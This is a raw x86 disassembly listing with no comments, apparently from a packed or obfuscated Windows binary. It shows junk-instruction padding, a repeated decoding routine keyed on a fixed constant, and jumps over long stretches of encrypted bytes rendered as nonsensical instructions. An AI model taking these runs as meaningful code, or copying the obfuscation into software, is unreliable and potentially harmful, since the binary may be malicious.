  413688:	call   DWORD PTR ds:0x42e014
  41368e:	movzx  ecx,BYTE PTR ds:0x42844d
  413695:	and    DWORD PTR ds:0x428569,ecx
  41369b:	sbb    ecx,0x7147
  4136a1:	and    DWORD PTR ds:0x4284e5,ebx
  4136a7:	mov    ecx,DWORD PTR ds:0x428495
  4136ad:	add    DWORD PTR ds:0x42843d,ecx
  4136b3:	and    DWORD PTR ds:0x42838d,0x5196
  4136bd:	mov    eax,ds:0x422728
  4136c2:	adc    DWORD PTR ds:0x428445,0x635d
  4136cc:	mov    DWORD PTR [ebp-0xc],eax
  4136cf:	cmp    DWORD PTR ds:0x4284f1,0x0
  4136d6:	mov    DWORD PTR ds:0x428365,0x6dcc
  4136e0:	mov    ecx,DWORD PTR ds:0x428461
  4136e6:	jmp    0x413753
  4136eb:	mov    DWORD PTR ds:0x4284fd,0x2cf
  4136f5:	mov    DWORD PTR ds:0x4285a1,0x621d
  4136ff:	cmp    DWORD PTR ds:0x4284f1,0x0
  413706:	jbe    0x41373d
  41370c:	push   0x4284f1
  413711:	push   0x428425
  413716:	push   0x2216
  41371b:	call   DWORD PTR ds:0x42e258
  413721:	and    ecx,ecx
  413723:	mov    ecx,DWORD PTR ds:0x4283cd
  413729:	mov    ecx,DWORD PTR [ecx]
  41372b:	add    DWORD PTR ds:0x42838d,ecx
  413731:	or     ecx,ecx
  413733:	sbb    DWORD PTR ds:0x42850d,0x6873
  41373d:	sbb    DWORD PTR ds:0x428515,ecx
  413743:	adc    DWORD PTR ds:0x428491,0x1149
  41374d:	or     DWORD PTR ds:0x428511,edx
  413753:	mov    eax,DWORD PTR [ebp-0x28]
  413756:	cmp    DWORD PTR ds:0x428475,0x0
  41375d:	mov    ecx,0xa9f
  413762:	mov    DWORD PTR ds:0x42843d,0x1875
  41376c:	mov    DWORD PTR ds:0x428511,0x319d
  413776:	jmp    0x41383a
  41377b:	mov    DWORD PTR ds:0x428501,0x86c
  413785:	cmp    DWORD PTR ds:0x428475,0x0
  41378c:	jle    0x4137bf
  413792:	push   0x50b5
  413797:	call   DWORD PTR ds:0x42e25c
  41379d:	add    DWORD PTR ds:0x428385,0x737d
  4137a7:	sub    ecx,DWORD PTR ds:0x428511
  4137ad:	mov    ecx,DWORD PTR ds:0x428585
  4137b3:	xor    ecx,DWORD PTR ds:0x428451
  4137b9:	mov    DWORD PTR ds:0x428585,ecx
  4137bf:	inc    ecx
  4137c0:	movzx  ecx,BYTE PTR ds:0x428385
  4137c7:	sub    ecx,DWORD PTR ds:0x4284f1
  4137cd:	mov    DWORD PTR ds:0x428385,ecx
  4137d3:	cmp    DWORD PTR ds:0x42846d,0x0
  4137da:	not    ecx
  4137dc:	mov    DWORD PTR ds:0x42842d,0x5561
  4137e6:	jmp    0x41383a
  4137eb:	mov    DWORD PTR ds:0x4285a1,0x2772
  4137f5:	cmp    DWORD PTR ds:0x42846d,0x0
  4137fc:	jle    0x41381e
  413802:	push   0x5196
  413807:	push   0x42822f
  41380c:	call   DWORD PTR ds:0x42e260
  413812:	sbb    DWORD PTR ds:0x428389,ecx
  413818:	xor    ecx,DWORD PTR ds:0x42859d
  41381e:	and    DWORD PTR ds:0x42845d,edi
  413824:	inc    DWORD PTR ds:0x428471
  41382a:	add    DWORD PTR ds:0x428379,0x3293
  413834:	or     DWORD PTR ds:0x428445,ecx
  41383a:	mov    DWORD PTR [ebp-0x24],eax
  41383d:	mov    ecx,DWORD PTR [ebp-0x24]
  413840:	push   0x4
  413842:	sub    DWORD PTR ds:0x4284fd,0x4aeb
  41384c:	pop    eax
  41384d:	sbb    DWORD PTR ds:0x42857d,0x428379
  413857:	sub    eax,ecx
  413859:	cmp    DWORD PTR ds:0x428391,0x0
  413860:	mov    ecx,DWORD PTR ds:0x428511
  413866:	not    ecx
  413868:	movzx  ecx,BYTE PTR ds:0x428369
  41386f:	mov    ecx,DWORD PTR ds:0x428485
  413875:	jmp    0x4138c3
  41387a:	mov    DWORD PTR ds:0x428501,0x61cd
  413884:	cmp    DWORD PTR ds:0x428391,0x0
  41388b:	je     0x4138b5
  413891:	push   0x428505
  413896:	push   0x4282ff
  41389b:	call   DWORD PTR ds:0x42e264
  4138a1:	or     DWORD PTR ds:0x428481,0x428445
  4138ab:	mov    DWORD PTR ds:0x428441,0x2055
  4138b5:	sub    ecx,DWORD PTR ds:0x42847d
  4138bb:	or     ecx,DWORD PTR ds:0x42842d
  4138c1:	neg    ecx
  4138c3:	mov    ecx,DWORD PTR [ebp-0x20]
  4138c6:	add    ecx,eax
  4138c8:	mov    DWORD PTR [ebp-0x30],ecx
  4138cb:	lea    eax,[ebp-0x3c]
  4138ce:	mov    DWORD PTR [ebp-0x38],eax
  4138d1:	mov    eax,DWORD PTR [ebp-0x18]
  4138d4:	mov    ecx,DWORD PTR [ebp-0x18]
  4138d7:	xor    eax,edi
  4138d9:	xor    ecx,ebx
  4138db:	shr    eax,0x2
  4138de:	shl    ecx,0x1e
  4138e1:	or     eax,ecx
  4138e3:	mov    DWORD PTR [ebp-0x2c],eax
  4138e6:	mov    DWORD PTR [ebp-0x8],0xa5069bbe
  4138ed:	mov    eax,DWORD PTR [ebp-0x8]
  4138f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4138f3:	xor    eax,edi
  4138f5:	xor    ecx,ebx
  4138f7:	shr    eax,0x2
  4138fa:	shl    ecx,0x1e
  4138fd:	or     ecx,eax
  4138ff:	push   ecx
  413900:	lea    eax,[ebp-0x8]
  413903:	push   eax
  413904:	lea    eax,[ebp-0x80]
  413907:	push   eax
  413908:	call   0x411c08
  41390d:	mov    eax,DWORD PTR [ebp-0x8]
  413910:	mov    ecx,DWORD PTR [ebp-0x8]
  413913:	xor    eax,edi
  413915:	xor    ecx,ebx
  413917:	shr    eax,0x2
  41391a:	shl    ecx,0x1e
  41391d:	or     ecx,eax
  41391f:	push   ecx
  413920:	lea    eax,[ebp-0x24]
  413923:	push   eax
  413924:	mov    eax,DWORD PTR [ebp+0x8]
  413927:	mov    ecx,DWORD PTR [ebp+0xc]
  41392a:	shrd   eax,ecx,0x2
  41392e:	shr    ecx,0x2
  413931:	mov    ecx,DWORD PTR [ebp+0x8]
  413934:	mov    edx,DWORD PTR [ebp+0xc]
  413937:	xor    eax,esi
  413939:	xor    edx,edx
  41393b:	or     eax,edx
  41393d:	lea    eax,[ebp+eax*4-0x7c]
  413941:	push   eax
  413942:	shl    ecx,0x1e
  413945:	call   0x411c08
  41394a:	mov    eax,DWORD PTR [ebp-0x8]
  41394d:	mov    ecx,DWORD PTR [ebp-0x8]
  413950:	xor    eax,edi
  413952:	xor    ecx,ebx
  413954:	shr    eax,0x2
  413957:	shl    ecx,0x1e
  41395a:	or     ecx,eax
  41395c:	push   ecx
  41395d:	lea    eax,[ebp-0x30]
  413960:	push   eax
  413961:	jmp    0x413c9a
  413966:	in     eax,dx
  413967:	dec    edi
  413968:	ret    
  413969:	in     al,dx
  41396a:	fs jl  0x413963
  41396d:	pop    ebx
  41396e:	push   0x6e3e744
  413973:	mov    bl,0x6a
  413975:	shr    esp,1
  413977:	xchg   BYTE PTR [esi-0x413b1242],bh
  41397d:	mov    esi,0xd97b9f35
  413982:	scas   al,BYTE PTR es:[edi]
  413983:	pop    eax
  413984:	and    al,0x84
  413986:	mov    DWORD PTR [ecx],ebp
  413988:	xchg   dl,ah
  41398a:	push   ds
  41398b:	xlat   BYTE PTR ds:[ebx]
  41398c:	xor    ch,BYTE PTR [ebx]
  41398e:	sub    dh,dl
  413990:	sbb    edx,esi
  413992:	push   edi
  413993:	bsf    eax,DWORD PTR [eax+0x38]
  413997:	pop    esi
  413998:	pop    ss
  413999:	dec    esp
  41399a:	jp     0x41398c
  41399c:	push   ebx
  41399d:	adc    DWORD PTR [edi+0x2],edi
  4139a0:	adc    al,0x92
  4139a2:	in     eax,dx
  4139a3:	dec    eax
  4139a4:	mov    ecx,0xb72c1ad8
  4139a9:	call   0xade:0x4cda0e0c
  4139b0:	nop
  4139b1:	daa    
  4139b2:	imul   esi,DWORD PTR [eax+0x7179b24a],0xffffff97
  4139b9:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139bc:	push   ecx
  4139bd:	ins    BYTE PTR es:[edi],dx
  4139be:	dec    edi
  4139bf:	cli    
  4139c0:	ret    
  4139c1:	and    eax,0x4d9dae55
  4139c6:	imul   ecx
  4139c8:	mov    al,ds:0xa2951f3e
  4139cd:	addr16 mov bh,0x12
  4139d0:	sub    BYTE PTR [ebx+0x4f],bl
  4139d3:	sub    al,0x99
  4139d5:	mov    edx,0x356ca6a8
  4139da:	xchg   ebx,eax
  4139db:	sti    
  4139dc:	xchg   ebp,eax
  4139dd:	clc    
  4139de:	data16 add BYTE PTR [esi+0x32c12650],ch
  4139e5:	(bad)  
  4139e6:	mov    ecx,es
  4139e8:	stos   DWORD PTR es:[edi],eax
  4139e9:	xlat   BYTE PTR ds:[ebx]
  4139ea:	fisttp DWORD PTR [esi]
  4139ec:	and    dh,BYTE PTR [edi+0x1a]
  4139ef:	xor    cl,BYTE PTR [esi]
  4139f1:	push   ebx
  4139f2:	adc    bl,BYTE PTR [ecx-0x7979b0f6]
  4139f8:	sub    eax,0xacfc578f
  4139fd:	cmp    DWORD PTR [edi+0x5ad3d8a9],0xffffff8a
  413a04:	mov    ch,0x49
  413a06:	ins    BYTE PTR es:[edi],dx
  413a07:	xchg   esp,eax
  413a08:	cld    
  413a09:	enter  0x3f28,0xb6
  413a0d:	imul   esi,DWORD PTR [ebp+0x5],0xb544fedc
  413a14:	push   esp
  413a15:	adc    edx,ebp
  413a17:	js     0x4139e5
  413a19:	inc    edx
  413a1a:	out    0x98,al
  413a1c:	sbb    eax,0x5a9409cc
  413a21:	ud0    ebp,DWORD PTR [ebx]
  413a24:	or     dl,BYTE PTR [edx-0x1cf1cc13]
  413a2a:	pop    esi
  413a2b:	cmp    DWORD PTR [bp+si-0x52ca],edi
  413a30:	inc    edx
  413a31:	pop    eax
  413a32:	sar    bh,1
  413a34:	push   ss
  413a35:	fistp  DWORD PTR [edx+eax*1+0x22b3f80d]
  413a3c:	add    BYTE PTR [esi+0x1cf684f1],0xd0
  413a43:	loop   0x4139dd
  413a45:	or     edx,DWORD PTR [eax-0x29]
  413a48:	inc    ecx
  413a49:	adc    eax,0x2aaa2b1c
  413a4e:	das    
  413a4f:	ins    DWORD PTR es:[edi],dx
  413a50:	outs   dx,BYTE PTR ds:[esi]
  413a51:	xchg   DWORD PTR [eax+0x5bf791c0],ebx
  413a57:	shr    ebx,1
  413a59:	rol    cl,0x5a
  413a5c:	adc    BYTE PTR [edi-0x75],dl
  413a5f:	xor    BYTE PTR ds:0x8a4ebe47,bh
  413a65:	sahf   
  413a66:	mov    ecx,0x16e9d8ba
  413a6b:	pop    edi
  413a6c:	mov    ebx,0x9223e7e8
  413a71:	shl    DWORD PTR ss:[eax-0x35a775c4],cl
  413a78:	xchg   edi,eax
  413a79:	js     0x413a8a
  413a7b:	std    
  413a7c:	xchg   edi,eax
  413a7d:	and    BYTE PTR [ebx],0x95
  413a80:	xor    eax,DWORD PTR [eax-0x19]
  413a83:	cld    
  413a84:	das    
  413a85:	lock shr BYTE PTR [ebp-0x41],1
  413a89:	cli    
  413a8a:	inc    esi
  413a8b:	dec    edi
  413a8c:	or     bh,ah
  413a8e:	arpl   WORD PTR [ecx],bx
  413a90:	sbb    esi,DWORD PTR [ecx+0x4]
  413a93:	iret   
  413a94:	ins    DWORD PTR es:[edi],dx
  413a95:	cdq    
  413a96:	lods   eax,DWORD PTR ds:[esi]
  413a97:	outs   dx,DWORD PTR ds:[esi]
  413a98:	gs out dx,al
  413a9a:	ds mov bl,0xa
  413a9d:	add    dh,BYTE PTR [ecx-0x11]
  413aa0:	sub    bl,cl
  413aa2:	xor    cl,BYTE PTR [eax+0xdd64d7]
  413aa8:	aad    0x9f
  413aaa:	pop    ecx
  413aab:	push   ss
  413aac:	mov    ds:0x5a2d2f49,eax
  413ab1:	sub    ebp,DWORD PTR [esi+0x4da1fdab]
  413ab7:	jbe    0x413aeb
  413ab9:	pop    edi
  413aba:	jmp    0x413b20
  413abc:	ds (bad) 
  413abe:	jecxz  0x413ac2
  413ac0:	gs ds std 
  413ac3:	xor    BYTE PTR [esi-0x5fb2002c],bl
  413ac9:	mov    al,0x3d
  413acb:	pop    edx
  413acc:	push   ebx
  413acd:	pop    ds
  413ace:	cs inc esp
  413ad0:	mov    cl,0xf8
  413ad2:	lds    esi,FWORD PTR [edi]
  413ad4:	cmp    eax,0x8fec22af
  413ad9:	pop    ecx
  413ada:	leave  
  413adb:	dec    esp
  413adc:	ret    0x5dd
  413adf:	mov    eax,DWORD PTR [ebx]
  413ae1:	sti    
  413ae2:	icebp  
  413ae3:	inc    edx
  413ae4:	cli    
  413ae5:	jno    0x413a7c
  413ae7:	xchg   esp,eax
  413ae8:	push   ebx
  413ae9:	xchg   esp,eax
  413aea:	inc    edx
  413aeb:	sub    eax,0x24926ff8
  413af0:	mov    edi,ecx
  413af2:	mov    esp,0x4d1a826d
  413af7:	or     cl,BYTE PTR [ebx+0x15154f44]
  413afd:	xor    BYTE PTR [edx-0x51],ah
  413b00:	and    al,0x45
  413b02:	pop    esi
  413b03:	enter  0xbd67,0xe3
  413b07:	rcr    BYTE PTR [ebx-0x510ad80f],0x5a
  413b0e:	dec    edi
  413b0f:	fdiv   QWORD PTR [edi]
  413b11:	jae    0x413b41
  413b13:	sbb    ebx,edi
  413b15:	adc    eax,0x2ea67d36
  413b1a:	add    DWORD PTR ds:0x80487528,0x55d9b2bd
  413b24:	iret   
  413b25:	push   ds
  413b26:	jbe    0x413b12
  413b28:	lods   al,BYTE PTR ds:[esi]
  413b29:	in     eax,0xad
  413b2b:	sub    DWORD PTR [ebx+ebx*4],0x39
  413b2f:	lahf   
  413b30:	jle    0x413afa
  413b32:	xor    BYTE PTR [eax],ah
  413b34:	sbb    eax,0x2f5e6545
  413b39:	jl     0x413ba1
  413b3b:	or     al,0x56
  413b3d:	int3   
  413b3e:	jno    0x413acd
  413b40:	adc    bl,dl
  413b42:	fsub   DWORD PTR [edi+edx*8]
  413b45:	out    dx,eax
  413b46:	cmp    DWORD PTR [ecx],ebp
  413b48:	and    al,0xe6
  413b4a:	out    0x67,al
  413b4c:	mov    ah,0x9c
  413b4e:	rcr    DWORD PTR [edx],0x8d
  413b51:	shl    BYTE PTR [esi+0x7f52dcf9],1
  413b57:	push   ss
  413b58:	mov    dh,0x67
  413b5a:	outs   dx,BYTE PTR ds:[esi]
  413b5b:	out    dx,al
  413b5c:	gs xchg edi,eax
  413b5e:	stos   DWORD PTR es:[edi],eax
  413b5f:	cld    
  413b60:	scas   al,BYTE PTR es:[edi]
  413b61:	dec    cx
  413b63:	mov    cl,0xcd
  413b65:	mov    al,ds:0x67962d4c
  413b6a:	sub    al,BYTE PTR [ecx+0x6c]
  413b6d:	shl    DWORD PTR [eax-0x18a10290],cl
  413b73:	dec    edx
  413b74:	mov    esp,0x91213b30
  413b79:	jl     0x413bc0
  413b7b:	jno    0x413b8e
  413b7d:	cli    
  413b7e:	sub    ch,BYTE PTR ds:0xc861d9e1
  413b84:	loop   0x413bd8
  413b86:	cmp    al,0x1a
  413b88:	ret    
  413b89:	nop
  413b8a:	mov    dh,ch
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	fs push 0xe1b93fbf
  413b93:	sti    
  413b94:	push   ecx
  413b95:	sub    dl,BYTE PTR [eax]
  413b97:	(bad)  
  413b98:	inc    esp
  413b99:	leave  
  413b9a:	cmp    ecx,edx
  413b9c:	pop    edx
  413b9d:	cld    
  413b9e:	mov    ds:0x8f8b478,al
  413ba4:	and    bh,BYTE PTR [edx+ecx*1+0x3d]
  413ba8:	test   esi,0x43c94cad
  413bae:	push   edx
  413baf:	popf   
  413bb0:	inc    ecx
  413bb1:	lds    edx,FWORD PTR ds:0x684a5574
  413bb7:	add    ecx,edi
  413bb9:	daa    
  413bba:	sar    ch,cl
  413bbc:	dec    esi
  413bbd:	cli    
  413bbe:	pop    ss
  413bbf:	in     al,0x26
  413bc1:	fs pop es
  413bc3:	cmc    
  413bc4:	adc    dl,BYTE PTR [esi-0x65]
  413bc7:	jp     0x413b6f
  413bc9:	shl    BYTE PTR [ebp-0x2002a88b],cl
  413bcf:	jg     0x413b95
  413bd1:	test   al,0xcf
  413bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bd4:	dec    eax
  413bd5:	or     edx,DWORD PTR [edi+0x74a663c5]
  413bdb:	pop    esp
  413bdc:	jbe    0x413b79
  413bde:	or     BYTE PTR [esi+0x47],dl
  413be1:	push   ecx
  413be2:	mov    ah,0xe7
  413be4:	adc    eax,DWORD PTR [ebx]
  413be6:	sub    BYTE PTR [eax],0xdb
  413be9:	daa    
  413bea:	jmp    0x413c54
  413bec:	es jnp 0x413bee
  413bef:	fdivr  st(7),st
  413bf1:	cld    
  413bf2:	add    dl,bh
  413bf4:	push   ecx
  413bf5:	inc    edx
  413bf6:	sbb    dl,bh
  413bf8:	mov    WORD PTR [eax-0x79],es
  413bfb:	dec    ebx
  413bfc:	xchg   esi,eax
  413bfd:	pop    es
  413bfe:	out    dx,eax
  413bff:	fwait
  413c00:	sahf   
  413c01:	xor    dl,BYTE PTR gs:0xecab876
  413c08:	mov    ch,0x9
  413c0a:	stos   BYTE PTR es:[edi],al
  413c0b:	fsub   DWORD PTR [ebx+0x6f]
  413c0e:	das    
  413c0f:	imul   ecx,edi,0x78
  413c12:	lods   eax,DWORD PTR ds:[esi]
  413c13:	cli    
  413c14:	xchg   BYTE PTR [ebp-0x43],al
  413c17:	push   esp
  413c18:	xchg   ah,cl
  413c1a:	add    BYTE PTR [esi],al
  413c1c:	pop    es
  413c1d:	and    eax,DWORD PTR [edx+0x6dec768e]
  413c23:	cwde   
  413c24:	call   0x7514:0x7291a58c
  413c2b:	sbb    esp,DWORD PTR [ecx+ecx*1-0x77]
  413c2f:	sti    
  413c30:	ins    BYTE PTR es:[edi],dx
  413c31:	mov    ds:0x6029267e,eax
  413c36:	into   
  413c37:	in     al,dx
  413c38:	jmp    0xd972d65b
  413c3d:	push   cs
  413c3e:	jnp    0x413c53
  413c40:	lods   al,BYTE PTR ds:[esi]
  413c41:	leave  
  413c42:	lods   al,BYTE PTR ds:[esi]
  413c43:	nop
  413c44:	or     DWORD PTR [edi+ecx*4-0x6c],esi
  413c48:	dec    edi
  413c49:	xlat   BYTE PTR ds:[ebx]
  413c4b:	xor    DWORD PTR [edx],esi
  413c4d:	dec    ebp
  413c4e:	psubusb mm5,QWORD PTR [ebp+0x43800c8e]
  413c55:	ret    0xf090
  413c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c59:	sar    DWORD PTR [ebp-0x1b],1
  413c5c:	sub    DWORD PTR [ebx-0x44],ebx
  413c5f:	push   es
  413c60:	fcomp  st(3)
  413c62:	jmp    0x413c5c
  413c64:	mov    dl,0x76
  413c66:	push   0xffffffb1
  413c68:	cmp    bh,bl
  413c6a:	pop    ebp
  413c6b:	mov    ebx,0x69887991
  413c70:	adc    cl,BYTE PTR [ecx-0x2f7f3d6f]
  413c76:	jns    0x413c05
  413c78:	add    DWORD PTR [ebp-0x49],eax
  413c7b:	lock call 0xfd53:0xe6fd5119
  413c83:	and    eax,0x9978bf35
  413c88:	icebp  
  413c89:	or     eax,0x5ad72f3e
  413c8e:	cwde   
  413c8f:	add    BYTE PTR [esp],bh
  413c92:	and    eax,0x6c7c662d
  413c97:	mov    edi,0x458b8753
  413c9c:	adc    BYTE PTR [ebx-0x53f0ebb3],cl
  413ca2:	enter  0xc102,0xe9
  413ca6:	add    cl,BYTE PTR [ebx+0x558b104d]
  413cac:	adc    al,0x33
  413cae:	(bad)  
  413caf:	xor    edx,edx
  413cb1:	or     eax,edx
  413cb3:	lea    eax,[ebp+eax*4-0x7c]
  413cb7:	push   eax
  413cb8:	shl    ecx,0x1e
  413cbb:	call   0x411c08
  413cc0:	mov    eax,DWORD PTR [ebp-0x8]
  413cc3:	mov    ecx,DWORD PTR [ebp-0x8]
  413cc6:	xor    ecx,ebx
  413cc8:	xor    eax,edi
  413cca:	shl    ecx,0x1e
  413ccd:	shr    eax,0x2
  413cd0:	or     ecx,eax
  413cd2:	push   ecx
  413cd3:	lea    eax,[ebp-0x2c]
  413cd6:	push   eax
  413cd7:	mov    eax,DWORD PTR [ebp+0x10]
  413cda:	mov    ecx,DWORD PTR [ebp+0x14]
  413cdd:	shrd   eax,ecx,0x2
  413ce1:	shr    ecx,0x2
  413ce4:	mov    ecx,DWORD PTR [ebp+0x10]
  413ce7:	mov    edx,DWORD PTR [ebp+0x14]
  413cea:	xor    edx,edx
  413cec:	xor    eax,esi
  413cee:	or     eax,edx
  413cf0:	shl    ecx,0x1e
  413cf3:	mov    ecx,DWORD PTR [ebp+0x10]
  413cf6:	mov    edx,DWORD PTR [ebp+0x14]
  413cf9:	shrd   ecx,edx,0x2
  413cfd:	shr    edx,0x2
  413d00:	mov    edx,DWORD PTR [ebp+0x10]
  413d03:	mov    ebx,DWORD PTR [ebp+0x14]
  413d06:	xor    ecx,esi
  413d08:	xor    ebx,ebx
  413d0a:	or     ecx,ebx
  413d0c:	add    eax,ecx
  413d0e:	lea    eax,[ebp+eax*4-0x7c]
  413d12:	push   eax
  413d13:	shl    edx,0x1e
  413d16:	call   0x411c08
  413d1b:	mov    eax,DWORD PTR [ebp-0x8]
  413d1e:	mov    ecx,DWORD PTR [ebp-0x8]
  413d21:	xor    ecx,0xfffffffe
  413d24:	shl    ecx,0x1e
  413d27:	xor    eax,edi
  413d29:	shr    eax,0x2
  413d2c:	or     ecx,eax
  413d2e:	push   ecx
  413d2f:	lea    eax,[ebp-0x38]
  413d32:	push   eax
  413d33:	mov    eax,DWORD PTR [ebp+0x10]
  413d36:	mov    ecx,DWORD PTR [ebp+0x14]
  413d39:	shrd   eax,ecx,0x2
  413d3d:	shr    ecx,0x2
  413d40:	jmp    0x414079
  413d45:	lock aad 0x95
  413d48:	dec    ecx
  413d49:	mov    bh,0x8a
  413d4b:	xor    al,0x7c
  413d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d4e:	cmp    eax,0x5d73dd72
  413d53:	jle    0x413d24
  413d55:	sbb    ecx,DWORD PTR [esi+edi*4-0x413b1242]
  413d5c:	mov    esi,0xc1cb7a3e
  413d61:	xlat   BYTE PTR ds:[ebx]
  413d62:	jnp    0x413d20
  413d64:	inc    ebp
  413d65:	push   ebx
  413d66:	outs   dx,BYTE PTR ds:[esi]
  413d67:	ret    0xd72a
  413d6a:	sbb    ah,BYTE PTR [ebx]
  413d6c:	daa    
  413d6d:	daa    
  413d6e:	add    esi,DWORD PTR [edx]
  413d70:	pop    edi
  413d71:	cdq    
  413d72:	in     al,dx
  413d73:	dec    edi
  413d74:	sub    edx,DWORD PTR [edi]
  413d76:	push   0xffffffa0
  413d78:	dec    esp
  413d79:	pop    esp
  413d7a:	(bad)  
  413d7b:	xchg   esi,eax
  413d7c:	jb     0x413dc9
  413d7e:	push   edi
  413d7f:	test   ebp,esi
  413d81:	dec    edi
  413d82:	inc    ebx
  413d83:	dec    edx
  413d84:	int3   
  413d85:	loope  0x413dac
  413d87:	jg     0x413d6d
  413d89:	cmp    bh,bh
  413d8b:	dec    al
  413d8d:	mov    ah,0x14
  413d8f:	jge    0x413e08
  413d91:	cmp    DWORD PTR [edx+0x69],ecx
  413d94:	shr    cl,cl
  413d96:	push   0x62c30367
  413d9b:	ret    
  413d9c:	jge    0x413de3
  413d9e:	outs   dx,DWORD PTR ds:[esi]
  413d9f:	sub    al,0xb8
  413da1:	cwde   
  413da2:	in     eax,0x54
  413da4:	in     al,dx
  413da5:	jns    0x413ddf
  413da7:	shl    bl,1
  413da9:	sahf   
  413daa:	fdivr  QWORD PTR ds:0x4cde1c23
  413db0:	and    al,0x6d
  413db2:	fld    TBYTE PTR [ebx+0x2d10c6e3]
  413db8:	(bad)  
  413dba:	and    al,0x82
  413dbc:	jge    0x413e19
  413dbe:	jg     0x413e14
  413dc0:	mov    WORD PTR [edi],cs
  413dc2:	rcr    BYTE PTR [ecx+0x29ebcce6],cl
  413dc8:	jg     0x413d8d
  413dca:	jmp    0x413db9
  413dcc:	inc    esp
  413dcd:	jmp    0x413d59
  413dcf:	mov    edi,0x7ee5d1db
  413dd4:	out    dx,eax
  413dd5:	ins    BYTE PTR es:[edi],dx
  413dd6:	scas   al,BYTE PTR es:[edi]
  413dd7:	mov    cl,0xa7
  413dd9:	cli    
  413dda:	in     al,dx
  413ddb:	mov    bh,0x9c
  413ddd:	cmp    ebx,DWORD PTR [ebx+0x6836d32d]
  413de3:	push   ebp
  413de4:	add    esp,ecx
  413de6:	mov    dh,0xb1
  413de8:	out    dx,eax
  413de9:	dec    esp
  413dea:	js     0x413da7
  413dec:	lea    ebx,[edi]
  413dee:	mov    esi,0x7c3df676
  413df3:	les    ebx,FWORD PTR [edx]
  413df5:	test   DWORD PTR [ecx+0x5f6c7c2d],ecx
  413dfb:	xchg   ebx,eax
  413dfc:	mov    al,ds:0x24e8c3bb
  413e01:	adc    DWORD PTR [ecx+0x51560087],edi
  413e07:	jae    0x413e5c
  413e09:	jg     0x413dd3
  413e0b:	gs jecxz 0x413e61
  413e0e:	in     al,0xa6
  413e10:	push   edx
  413e11:	jns    0x413da5
  413e13:	cdq    
  413e14:	mov    BYTE PTR [edx+0x4b],bl
  413e17:	repz jns 0x413e8a
  413e1a:	jle    0x413dc1
  413e1c:	scas   eax,DWORD PTR es:[edi]
  413e1d:	fisttp DWORD PTR [edx-0x62c1ffc6]
  413e23:	leave  
  413e24:	jp     0x413e6e
  413e26:	leave  
  413e27:	dec    ebp
  413e28:	add    ah,BYTE PTR [esi+0x327be5ff]
  413e2e:	cmp    ebp,esi
  413e30:	xor    al,0x7b
  413e32:	sbb    BYTE PTR [edi],al
  413e34:	and    ch,BYTE PTR [edi-0xbe0871d]
  413e3a:	inc    esi
  413e3b:	and    DWORD PTR ds:0xc4eee98f,ebp
  413e41:	inc    edx
  413e42:	inc    edx
  413e43:	sahf   
  413e44:	arpl   WORD PTR [ebx+0x74e21edc],sp
  413e4a:	ins    BYTE PTR es:[edi],dx
  413e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e4c:	fidiv  WORD PTR [ebp-0x62f92ea9]
  413e52:	nop
  413e53:	xor    DWORD PTR [edx],esp
  413e55:	cwde   
  413e56:	jo     0x413e3e
  413e58:	add    ebp,DWORD PTR [ecx-0x7f]
  413e5b:	mov    bl,0x66
  413e5d:	loope  0x413e40
  413e5f:	jo     0x413e26
  413e61:	jnp    0x413e81
  413e63:	jmp    0x413e17
  413e65:	adc    esi,DWORD PTR [ebx+0x4c]
  413e68:	sbb    dh,cl
  413e6a:	mov    al,BYTE PTR [ebx+0x3aec7908]
  413e70:	inc    edi
  413e71:	dec    esp
  413e72:	test   BYTE PTR [ecx-0x79758353],ah
  413e78:	fsubr  QWORD PTR [esi+0xd52c2b0]
  413e7e:	or     ebx,DWORD PTR fs:[ebx+ebp*4]
  413e82:	and    BYTE PTR [esp+eiz*2-0xe],0xe
  413e87:	ret    0x608e
  413e8a:	lods   eax,DWORD PTR ds:[esi]
  413e8b:	and    ah,ah
  413e8d:	mov    esp,0xbb613fa2
  413e92:	push   ss
  413e93:	push   es
  413e94:	adc    esi,ecx
  413e96:	xchg   ebp,eax
  413e97:	ret    
  413e98:	repz sub edx,DWORD PTR [ebx]
  413e9b:	cmp    eax,0x84c3b7d9
  413ea0:	push   cs
  413ea1:	enter  0x72e9,0xe7
  413ea5:	sbb    edx,DWORD PTR [ebx+0x732fbe57]
  413eab:	ins    DWORD PTR es:[edi],dx
  413eac:	ss sbb eax,0xf064afb8
  413eb2:	xchg   esp,eax
  413eb3:	sti    
  413eb4:	and    BYTE PTR [esi+0x79],al
  413eb7:	ja     0x413ed8
  413eb9:	cli    
  413eba:	clc    
  413ebb:	(bad)  
  413ebc:	sub    dh,BYTE PTR [ebp-0x62a5115a]
  413ec2:	rcr    BYTE PTR [edx],0x22
  413ec5:	mov    al,ds:0x9249b322
  413eca:	inc    edi
  413ecb:	mov    cl,0x2a
  413ecd:	dec    edx
  413ece:	push   esp
  413ecf:	popw   ds
  413ed1:	sub    eax,0xce23185e
  413ed6:	ja     0x413edc
  413ed8:	xor    eax,DWORD PTR [edi-0x339c3553]
  413ede:	sub    edi,edi
  413ee0:	popf   
  413ee1:	shl    DWORD PTR [ebx-0x69],0xbd
  413ee5:	dec    edx
  413ee6:	pop    esi
  413ee7:	in     eax,0xd2
  413ee9:	adc    al,BYTE PTR [ebp-0x4e4d3cc]
  413eef:	(bad)  
  413ef0:	jb     0x413e7f
  413ef2:	jae    0x413f26
  413ef4:	ret    0xd444
  413ef7:	ds or  cl,dh
  413efa:	mov    ch,0xcd
  413efc:	not    DWORD PTR [ebx-0x47]
  413eff:	push   ebx
  413f00:	call   0x8dced88d
  413f05:	cwde   
  413f06:	push   cs
  413f07:	out    0x90,al
  413f09:	inc    ebp
  413f0a:	es xchg esi,eax
  413f0c:	ror    DWORD PTR [ebp-0x530543d],0xb8
  413f13:	fcmovu st,st(7)
  413f15:	stc    
  413f16:	imul   eax,DWORD PTR [ebx],0x53
  413f19:	shl    DWORD PTR [ebx+0x61787719],0x78
  413f20:	dec    edx
  413f21:	retf   
  413f22:	cdq    
  413f23:	xor    DWORD PTR [esi],edx
  413f25:	ret    0x2e8e
  413f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f29:	pop    esi
  413f2a:	mov    esi,0x518f2592
